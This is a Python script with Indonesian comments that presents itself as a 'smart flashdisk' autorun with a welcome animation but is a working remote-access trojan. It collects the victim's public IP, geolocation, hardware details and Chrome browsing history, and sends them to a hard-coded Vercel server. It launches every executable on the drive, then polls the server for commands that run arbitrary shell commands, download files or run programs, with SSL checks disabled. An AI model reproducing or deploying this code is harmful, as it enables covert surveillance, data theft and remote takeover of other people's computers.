import os
import subprocess
import threading
import time
import socket
import requests
import platform
import psutil
import json
import sys
from concurrent.futures import ThreadPoolExecutor
import urllib3
import datetime

# Nonaktifkan warning SSL (jika perlu, untuk menghindari error sertifikat)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ========== KONFIGURASI ==========
SERVER_URL = "https://vercel-server-ten-peach.vercel.app"  # Ganti dengan URL Vercel Anda
# =================================

def get_public_ip():
    """Ambil IP publik dari beberapa layanan"""
    services = [
        'https://api.ipify.org',
        'https://icanhazip.com',
        'https://checkip.amazonaws.com'
    ]
    for url in services:
        try:
            resp = requests.get(url, timeout=5, verify=False)
            return resp.text.strip()
        except:
            continue
    return "UNKNOWN_IP"

def get_hostname():
    return socket.gethostname()

def get_location_from_ip(ip):
    """Dapatkan lokasi (kota, region, koordinat) dari ipinfo.io"""
    try:
        resp = requests.get(f"https://ipinfo.io/{ip}/json", timeout=5, verify=False)
        data = resp.json()
        loc = data.get('loc', '').split(',')
        lat = float(loc[0]) if len(loc) == 2 else None
        lon = float(loc[1]) if len(loc) == 2 else None
        return {
            'lat': lat,
            'lon': lon,
            'city': data.get('city', 'Unknown'),
            'region': data.get('region', 'Unknown'),
            'country': data.get('country', 'Unknown')
        }
    except Exception as e:
        print(f"Gagal ambil lokasi: {e}")
        return {'lat': None, 'lon': None, 'city': 'Unknown', 'region': 'Unknown', 'country': 'Unknown'}

def get_hardware_info():
    """Kumpulkan informasi hardware lengkap"""
    info = {
        "os": platform.system() + " " + platform.release(),
        "os_version": platform.version(),
        "machine": platform.machine(),
        "processor": platform.processor(),
        "cpu_count": psutil.cpu_count(logical=True),
        "cpu_freq_mhz": psutil.cpu_freq().max if psutil.cpu_freq() else None,
        "ram_total_gb": round(psutil.virtual_memory().total / (1024**3), 2),
        "ram_available_gb": round(psutil.virtual_memory().available / (1024**3), 2),
        "disk_usage": {}
    }
    # Disk info
    for part in psutil.disk_partitions():
        try:
            usage = psutil.disk_usage(part.mountpoint)
            info["disk_usage"][part.device] = {
                "total_gb": round(usage.total / (1024**3), 2),
                "used_gb": round(usage.used / (1024**3), 2),
                "free_gb": round(usage.free / (1024**3), 2),
                "percent": usage.percent
            }
        except:
            pass
    # GPU (Windows dengan PowerShell)
    if platform.system() == "Windows":
        try:
            cmd = 'powershell -Command "Get-WmiObject Win32_VideoController | Select-Object -ExpandProperty Name"'
            gpu_out = subprocess.check_output(cmd, shell=True, text=True, stderr=subprocess.DEVNULL)
            lines = [line.strip() for line in gpu_out.strip().split('\n') if line.strip()]
            info["gpu"] = lines if lines else ["Tidak terdeteksi"]
        except:
            info["gpu"] = ["Tidak terdeteksi"]
    else:
        info["gpu"] = ["N/A"]
    return info

def get_browser_history():
    """Ambil riwayat browser (Chrome) - khusus Windows"""
    history = []
    if platform.system() == "Windows":
        chrome_history_path = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History")
        if os.path.exists(chrome_history_path):
            try:
                import sqlite3
                conn = sqlite3.connect(chrome_history_path)
                cursor = conn.cursor()
                cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50")
                rows = cursor.fetchall()
                for row in rows:
                    url, title, timestamp = row
                    if timestamp:
                        # Chrome timestamp: microseconds since 1601-01-01
                        dt = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=timestamp)
                        time_str = dt.strftime("%Y-%m-%d %H:%M:%S")
                    else:
                        time_str = "Unknown"
                    history.append({'url': url, 'title': title if title else url, 'time': time_str})
                conn.close()
            except Exception as e:
                print(f"Gagal baca history Chrome: {e}")
        else:
            # Alternatif: ambil file Recent sebagai fallback
            recent = os.path.expanduser("~\\Recent")
            if os.path.exists(recent):
                for f in os.listdir(recent)[:20]:
                    full = os.path.join(recent, f)
                    ctime = time.ctime(os.path.getctime(full))
                    history.append({'url': f, 'title': 'File Recent', 'time': ctime})
    return history

def scan_executables(flashdisk_root):
    """Cari semua file .exe di flashdisk (rekursif)"""
    exe_list = []
    for root, _, files in os.walk(flashdisk_root):
        for file in files:
            if file.lower().endswith('.exe'):
                exe_list.append(os.path.join(root, file))
    return exe_list

def run_exe_parallel(exe_path):
    """Jalankan file .exe secara asynchronous"""
    try:
        subprocess.Popen([exe_path], shell=True)
        print(f"[RUN] {exe_path}")
    except Exception as e:
        print(f"[ERROR] {exe_path}: {e}")

def send_initial_report(ip, hostname, hardware, exe_list, location, browser_history):
    """Kirim laporan pertama ke server (hardware, lokasi, history)"""
    url = f"{SERVER_URL}/report"
    data = {
        "ip": ip,
        "hostname": hostname,
        "hardware": hardware,
        "executables": exe_list,
        "location": location,
        "browser_history": browser_history
    }
    try:
        resp = requests.post(url, json=data, timeout=10, verify=False)
        if resp.status_code == 200:
            print("[SERVER] Laporan awal terkirim")
        else:
            print(f"[SERVER] Gagal kirim laporan awal: {resp.status_code}")
    except Exception as e:
        print(f"[SERVER] Error: {e}")

def send_location_update(hostname, location):
    """Kirim update lokasi (digunakan untuk perintah get_location)"""
    try:
        requests.post(f"{SERVER_URL}/update_location", json={"hostname": hostname, "location": location}, timeout=5, verify=False)
        print("[LOCATION] Update lokasi terkirim")
    except Exception as e:
        print(f"[LOCATION] Gagal update: {e}")

def send_browser_history(hostname, history):
    """Kirim riwayat browser ke server"""
    try:
        requests.post(f"{SERVER_URL}/update_browser_history", json={"hostname": hostname, "browser_history": history}, timeout=5, verify=False)
        print(f"[BROWSER] {len(history)} riwayat dikirim")
    except Exception as e:
        print(f"[BROWSER] Gagal kirim: {e}")

def poll_commands(hostname):
    """Polling perintah dari server setiap 10 detik"""
    url_poll = f"{SERVER_URL}/poll_commands"
    url_result = f"{SERVER_URL}/command_result"
    while True:
        try:
            resp = requests.post(url_poll, json={"hostname": hostname}, timeout=5, verify=False)
            if resp.status_code == 200:
                commands = resp.json()
                for cmd in commands:
                    cmd_id = cmd['id']
                    cmd_type = cmd['command_type']
                    cmd_data = cmd['command_data']
                    print(f"[COMMAND] Dapat perintah: {cmd_type} - {cmd_data}")
                    status, result = execute_command(cmd_type, cmd_data, hostname)
                    # Laporkan hasil eksekusi
                    requests.post(url_result, json={
                        "command_id": cmd_id,
                        "status": status,
                        "result": result
                    }, timeout=5, verify=False)
            time.sleep(10)
        except Exception as e:
            print(f"[POLLING] Error: {e}")
            time.sleep(30)

def execute_command(cmd_type, cmd_data, hostname):
    """Eksekusi perintah dari server"""
    try:
        if cmd_type == "text":
            print(f"\n[PESAN DARI SERVER]: {cmd_data}\n")
            return "success", "Pesan ditampilkan di console client"
        elif cmd_type == "download":
            local_filename = os.path.basename(cmd_data.split('/')[-1])
            if not local_filename:
                local_filename = "downloaded_file"
            filepath = os.path.join(os.path.dirname(os.path.abspath(__file__)), local_filename)
            r = requests.get(cmd_data, stream=True, verify=False)
            with open(filepath, 'wb') as f:
                for chunk in r.iter_content(chunk_size=8192):
                    f.write(chunk)
            return "success", f"File disimpan ke {filepath}"
        elif cmd_type == "run":
            output = subprocess.check_output(cmd_data, shell=True, text=True, stderr=subprocess.STDOUT, timeout=30)
            return "success", output[:1000]
        elif cmd_type == "exec_exe":
            exe_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), cmd_data)
            if os.path.exists(exe_path):
                subprocess.Popen([exe_path], shell=True)
                return "success", f"Menjalankan {cmd_data}"
            else:
                return "failed", f"File {cmd_data} tidak ditemukan di flashdisk"
        elif cmd_type == "get_browser_history":
            history = get_browser_history()
            send_browser_history(hostname, history)
            return "success", f"Mengirim {len(history)} entri riwayat browser"
        elif cmd_type == "get_location":
            ip = get_public_ip()
            loc = get_location_from_ip(ip)
            send_location_update(hostname, loc)
            return "success", f"Lokasi terbaru: {loc['city']}, {loc['country']}"
        elif cmd_type == "get_system_info":
            hardware = get_hardware_info()
            # Kirim update hardware lewat report? Atau cukup return
            # Untuk kemudahan, kita kirim juga ke server via report endpoint (opsional)
            try:
                requests.post(f"{SERVER_URL}/report", json={
                    "hostname": hostname,
                    "ip": get_public_ip(),
                    "hardware": hardware,
                    "executables": [],
                    "location": get_location_from_ip(get_public_ip()),
                    "browser_history": []
                }, timeout=5, verify=False)
            except:
                pass
            return "success", json.dumps(hardware)[:1000]
        else:
            return "failed", f"Tipe perintah tidak dikenal: {cmd_type}"
    except Exception as e:
        return "failed", str(e)[:500]

def autorun_animation():
    """Animasi teks selamat datang yang keren"""
    msg = "*** SELAMAT DATANG DI FLASHDISK CERDAS ***"
    sys.stdout.write('\r' + ' ' * 80 + '\r')
    for ch in msg:
        sys.stdout.write(ch)
        sys.stdout.flush()
        time.sleep(0.05)
    print()

def main():
    # Jalankan animasi di thread sendiri
    threading.Thread(target=autorun_animation, daemon=True).start()
    
    # Kumpulkan data
    ip = get_public_ip()
    hostname = get_hostname()
    hardware = get_hardware_info()
    location = get_location_from_ip(ip)
    browser_history = get_browser_history()
    flash_root = os.path.dirname(os.path.abspath(__file__))
    exe_files = scan_executables(flash_root)
    
    print(f"Ditemukan {len(exe_files)} file .exe di flashdisk")
    print(f"IP Publik: {ip}")
    print(f"Lokasi: {location['city']}, {location['country']}")
    print(f"Riwayat browser: {len(browser_history)} entri")
    
    # Jalankan semua file .exe secara paralel
    with ThreadPoolExecutor(max_workers=10) as executor:
        executor.map(run_exe_parallel, exe_files)
    
    # Kirim laporan awal ke server
    send_initial_report(ip, hostname, hardware, exe_files, location, browser_history)
    
    # Mulai polling perintah (tetap berjalan)
    poll_commands(hostname)

if __name__ == "__main__":
    main()